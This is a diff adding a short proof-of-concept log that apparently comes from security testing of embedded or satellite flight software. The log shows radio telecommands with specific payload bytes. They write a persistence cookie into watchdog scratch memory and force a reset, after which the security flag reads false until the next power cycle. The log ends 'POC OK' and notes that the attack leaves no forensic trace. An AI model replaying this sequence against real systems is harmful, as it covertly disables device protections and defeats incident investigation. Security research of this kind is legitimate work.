@@ -1,0 +1,22 @@
+[   0.000] ========================================================================
+[   0.000] V-21 watchdog scratch persistence cookie
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x1A via=radio AES  payload=5045525300000000000000000000000000000000000000000000000000000000
+[   0.001] <-- TM apid=0x1A clear len=8
+[   0.001] --> TC apid=0x18 via=radio AES  payload=00200020488005400400
+[   0.001] <-- TM apid=0x18 clear len=12
+[   0.001] MEMCPY 'PERS' -> scratch7 (0x40058048) ok
+[   0.001] --> TC apid=0x02 via=radio AES  payload=-
+[   0.002] <-- TM apid=0x02 clear len=4
+[   0.002] RESETC ack: boot_count=1 cookie_flag=1
+[   0.002] --> TC apid=0x0C via=usb clear payload=-
+[   0.002] <-- TM apid=0x0C clear len=27
+[   0.002] post-reboot flags2=0x20 PERSIST=True secure=False
+[   0.002] --> POWER CYCLE (scratch + SRAM die, flash survives)
+[   0.002] --> TC apid=0x0C via=usb AES  payload=-
+[   0.002] <-- TM apid=0x0C AES len=27
+[   0.002] after power cycle: secure=True PERSIST=False (scratch is volatile)
+[   0.002] => attacker toggles a protection policy whose very existence leaves no forensic trace after the next power cycle
+[   0.002] ========================================================================
+[   0.002] POC OK
+[   0.002] ========================================================================
